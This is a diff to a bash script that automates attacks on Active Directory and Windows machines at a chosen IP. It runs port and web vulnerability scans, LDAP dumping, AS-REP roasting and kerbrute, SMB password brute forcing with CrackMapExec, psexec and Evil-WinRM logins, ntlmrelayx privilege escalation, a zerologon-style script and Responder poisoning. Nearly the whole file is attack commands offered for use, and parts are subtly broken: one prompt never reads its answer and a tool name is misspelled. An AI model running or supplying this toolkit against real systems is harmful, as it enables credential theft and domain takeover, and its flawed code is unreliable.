@@ -1,13 +1,19 @@
 #!/bin/bash
 
-# May need to change location of Impacket if not within PATH
+# May need to change location of Impacket if not within PATH, if you do not know how to do this the script can redownload for you
+# This script is used to enumerate AD or windows machines from not within the "network". Such as starting outside but being able to reach the DC, or reach the network.
+# Script will save output to the domainip.txt file, for ldap it will create a new directory (nobody reads scripts anyways)
+# Thanks for using!
 
 echo -e '\E[31;40m' "Made by OvergrownCarrot1, thanks for using"
 echo ""
-echo -e '\E[31;35m' "This script looks at other tools, you need both impacket and crackmapexec downloaded and in $PATH to work correctly"
+echo -e '\E[31;35m' "This script looks at other tools, you need impacket, feroxbuster and crackmapexec downloaded and in $PATH to work correctly"
 sleep 2
 echo ""
 echo -e '\E[31;35m' "If you do not know all the information below then leave blank, the more information the more enumeration will happen, may need to run multiple times and check the $DOMAINIP.txt file for more information"; tput sgr0
+sleep 2
+echo ""
+echo -e '\E[31;35m' "Anything that is needed to be downloaded is downloaded with Kali distro in mind, if you use another distro do it yourself..."
 sleep 2
 echo ""
 echo -e '\E[31;40m' "Script is not stuck, it is saving everything to a text file, kerbrute may take a very long time depending on wordlist if using xato-net-10-million-usernames be very patient"; tput sgr0
@@ -16,23 +22,49 @@ echo ""
 
 read -p "Lets start off with the important questions NIN? (Not streamer friendly since that is like a thing or something) (y/n)" answer
 if [ $answer = y ] ; then
-	read -p "My Homie... what song (closer/perfect/head/hand)?" answer
-	if [ $answer = closer ] ; then
+	read -p "My Homie... what song (closer(c)/perfect(p)/head(he)/hand(ha))?" answer
+	if [ $answer = c ] ; then
 		echo "You dirty dog you"
 		xdg-open https://youtube.com/watch?v=ccY25Cb3im0
-	elif [ $answer = perfect ] ; then
+	elif [ $answer = p ] ; then
 		echo "Classic!"
 		xdg-open https://youtube.com/watch?v=dn3j6-yQKWQ
-	elif [ $answer = head ] ; then
+	elif [ $answer = he ] ; then
 		echo "Bow down before the one you serve..."
 		xdg-open https://youtube.com/watch?v=ao-Sahfy7Hg
-	elif [ $answer = hand ] ; then
+	elif [ $answer = ha ] ; then
 		echo "Dont bite"
 		xdg-open https://youtube.com/watch?v=xwhBRJStz7w
 	else 
-		echo "I am not going to type out every song come on man"
+		echo "I am not going to type out every song, come on man"
 	fi
 fi
+sleep 1
+
+read -p "Do you need any of the following tools? (feroxbuster(f), impacket(i), crackmapexec(c), all (a), none(n)"
+if [ $answer = f ] ; then
+	echo -e '\E[31;40m' "Downloading feroxbuster"
+	sudo apt update
+	sudo apt install -y feroxbuster
+elif [ $answer = i ] ; then
+	echo -e '\E[31;40m' "Downloading impacket"
+	sudo apt update
+	sudo apt install python3-impacket
+elif [ $answer = c ] ; then
+	echo -e '\E[31;40m' "Downloading crackmapexec"
+	sudo apt update
+	sudo apt install crackmapexec
+elif [ $answer = a ] ; then
+	echo -e '\E[31;40m' "Downloading all 3"
+	sudo apt install -y feroxbuster
+	sudo apt install python3-impacket
+	sudo apt install crackmapexec
+elif [ $answer = n ] ; then
+	echo -e '\E[31;40m' "Not downloading anything continuing script"
+else
+	echo -e '\E[31;40m' "Help me help you... that is not an answer"
+fi
+sleep 1 
 
 echo ""
 echo -e '\E[31;40m' "Domain Name"; tput sgr0
@@ -57,10 +89,11 @@ elif [ $answer = n ] ; then
 else
 	echo ""
 fi
+sleep 1
 
 echo -e '\E[31;35m' "Running NMAP to see what is open and putting in $DOMAINIP.txt, only looking at certain ports"; tput sgr0
-
-nmap -p 21,25,139,445,80,8080,8888,111,3389,5985,135,53,593,3269,636,389,88,2049,1521,3306,1433 -vv -Pn -n -T4 $DOMAINIP > $DOMAINIP.txt
+nmap -p 21,25,139,445,80,8080,8888,111,3389,5985,135,53,593,3269,636,389,88,443,2049,1521,3306,1433 -vv -Pn -n -T4 -A $DOMAINIP > $DOMAINIP.txt
+echo -e '\E[31;35m' "Ran NMAP on the following ports 21,25,139,445,80,8080,8888,111,3389,5985,135,53,593,3269,636,389,88,443,2049,1521,3306,1433"
 cat $DOMAINIP.txt | grep open > $DOMAINIP.open.txt
 rm -rf $DOMAINIP.txt
 mv $DOMAINIP.open.txt $DOMAINIP.txt
@@ -97,11 +130,26 @@ then
 else
 	echo ""
 fi
+sleep 1
+
+if [ $USER ] && [ $PASS ]
+then
+	read -p "Since you provided username and password would like to try ldapdomaindump? (y/n)" answer
+	if [ $answer = y ] ; then
+		echo "Making $DOMAINIP.ldap directory"
+		mkdir $DOMAINIP.ldap
+		ldapdomaindump -u $USER -p $PASS $DOMAINIP
+		cd ..
+		echo "May want to check out $DOMAINIP.ldap directory to see if there is anything useful in there"
+	else 
+		echo "Continuing Script"
+	fi
+fi
 
 if grep 88/tcp $DOMAINIP.txt
 then
 	echo "IP may be a domain controller, port 88 is open"
-	read -p "Try one of the following, type answer (kerberoasting(ki)/kerbrute(kb)/all(a)/none(n) ex: ki)" answer
+	read -p "Try one of the following (kerberoasting(ki)/kerbrute(kb)/all(a)/none(n) ex: ki)" answer
 	if [ $answer = ki ] ; then
 		GetNPUsers.py DOMAIN/ -no-pass -usersfile $USERFILE -dc-ip $DOMAINIP >> $DOMAINIP.txt
 	elif [ $answer = kb ] ; then
@@ -149,7 +197,8 @@ then
 	echo -e '\E[31;35m' "Creating new directory to put any information found into $DOMAINIP.ldap"; tput sgr0
 	mkdir $DOMAINIP.ldap
 	cd $DOMAINIP.ldap
-	ldapdomaindump ldap://$DOMAINIP:389 
+	echo -e '\E[31;35m' "If information was dumped it will be in here"
+	ldapdomaindump ldap://$DOMAINIP:389
 	cd ..
 	ldapsearch -H ldap://$DOMAINIP -x -b "DC=$DOMAIN,DC=local" '(objectclass=person)' >> $DOMAINIP.txt
 fi
@@ -174,6 +223,62 @@ then
 		echo -e '\E[31;35m' "Continuing Script"
 	else
 		echo -e '\E[31;35m' "Need a y or n"
+	fi
+fi
+sleep 1
+
+if grep 8080/tcp $DOMAINIP.txt
+then
+	echo -e '\E[31;35m' "There may be a web server running on port 8080"; tput sgr0
+	nmap $DOMAINIP --script=http-vuln*,http-enum -p 8080 -sC -sV -Pn >> $DOMAINIP.txt
+	read -p "Would you like to run a feroxbuster with big.txt, may take a while? (y/n)" answer
+	if [ $answer = y ] ; then
+		feroxbuster -u http://$DOMAINIP:8080 -w /usr/share/wordlists/dirb/big.txt >> $DOMAINIP.txt
+	elif [ $answer = n ] ; then
+		echo -e '\E[31;35m' "Continuing Script"
+	else
+		echo -e '\E[31;35m' "Need a y or n"
+	fi
+fi
+sleep 1
+
+if grep 8888/tcp $DOMAINIP.txt
+then
+	echo -e '\E[31;35m' "There may be a web server running on port 8888"; tput sgr0
+	nmap $DOMAINIP --script=http-vuln*,http-enum -p 8888 -sC -sV -Pn >> $DOMAINIP.txt
+	read -p "Would you like to run a feroxbuster with big.txt, may take a while? (y/n)" answer
+	if [ $answer = y ] ; then
+		feroxbuster -u http://$DOMAINIP:8888 -w /usr/share/wordlists/dirb/big.txt >> $DOMAINIP.txt
+	elif [ $answer = n ] ; then
+		echo -e '\E[31;35m' "Continuing Script"
+	else
+		echo -e '\E[31;35m' "Need a y or n"
+	fi
+fi
+sleep 1
+
+if grep 443/tcp $DOMAINIP.txt
+then
+	echo -e '\E[31;35m' "There may be a web server running on port 443"; tput sgr0
+	nmap $DOMAINIP --script=http-vuln*,http-enum -p 443 -sC -sV -Pn >> $DOMAINIP.txt
+	read -p "Would you like to run sslscan(s), feroxbuster(f), both(b) or none(n)?" answer
+	if [ $answer = s ] ; then
+		echo -e '\E[31;35m' "Running SSLSCAN to view certificates, may take a minute"
+		sslscan --show-certificate $DOMAINIP >> $DOMAINIP.txt
+		sslscan $DOMAINIP >> $DOMAINIP.txt
+	elif [ $answer = f ] ; then
+		echo -e '\E[31;35m' "Running feroxbuster with big.txt"
+		feroxbuster -u https://$DOMAINIP:443 -w /usr/share/wordlists/dirb/big.txt >> $DOMAINIP.txt
+	elif [ $answer = b ] ; then
+		echo -e '\E[31;35m' "Running SSLSCAN to view certificates, may take a minute"
+		sslscan --show-certificate $DOMAINIP >> $DOMAINIP.txt
+		sslscan $DOMAINIP >> $DOMAINIP.txt
+		echo -e '\E[31;35m' "Running feroxbuster with big.txt"
+		feroxbuster -u https://$DOMAINIP:443 -w /usr/share/wordlists/dirb/big.txt >> $DOMAINIP.txt
+	elif [ $answer = n ] ; then
+		echo -e '\E[31;35m' "Continuing Script"
+	else
+		echo -e '\E[31;35m' "Not an answer"
 	fi
 fi
 sleep 1
@@ -270,6 +375,7 @@ if [ $answer = y ] ; then
 	read SHARENAME
 	python3 $ZEROLOC "$SHARENAME" "$DOMAINIP" 
 fi
+sleep 1
 
 read -p "Test for Login Brute Force through Crackmapexec SMB? (y/n)" answer
 if [ $answer = y ] ; then
@@ -280,6 +386,7 @@ if [ $answer = y ] ; then
 	read PASSFILE
 	crackmapexec smb $DOMAINIP -u $USERNAME -p $PASSFILE -d $DOMAIN --continue-on-success >> $DOMAINIP.txt
 fi
+sleep 1
 
 if grep 5985/tcp $DOMAINIP.txt
 then
@@ -294,6 +401,7 @@ then
 		echo "Not trying Evil-WinRM Login"
 	fi
 fi
+sleep 1
 
 read -p "Test for PSExec Login (y/n)" answer
 if [ $answer = y ] ; then
@@ -303,6 +411,7 @@ if [ $answer = y ] ; then
 	read PSPASS
 	psexec.py "$DOMAIN/$PSUSER:$PSPASS@$DOMAINIP"
 fi
+sleep 1
 
 read -p "Try and escalate user with ntlmrealyx.py? (y/n)" answer
 if [ $answer = y ] ; then
@@ -310,6 +419,7 @@ if [ $answer = y ] ; then
 	read NTLMUSER
 	ntlmrealyx.py -t ldap://$DOMAINIP --escalate-user $NTLMUSER
 fi
+sleep 1
 
 if grep 3389/tcp $DOMAINIP.txt
 then
@@ -339,6 +449,7 @@ then
 		echo "No idea what you want from me"
 	fi
 fi
+sleep 1
 
 read -p "Do you want to run external Bloodhound? (y/n)" answer
 if [ $answer = y ] ; then
@@ -361,6 +472,7 @@ if [ $answer = y ] ; then
 		echo "Not a valid answer"
 	fi
 fi
+sleep 1
 
 read -p "Do you want to open a new tab for responder? (y/n)" answer
 if [ $answer = y ] ; then
@@ -368,3 +480,6 @@ if [ $answer = y ] ; then
 	read INT
 	xterm -e "sudo responder -I $INT -rdwv;bash"
 fi
+
+# if you actually read this, then good job, if you just ran it... shame on you, know what something is doing before you do anything, good thing
+# nothing malicious is happening to your own system!!! READ THE DAMN SCRIPTS ON GITHUB!!!
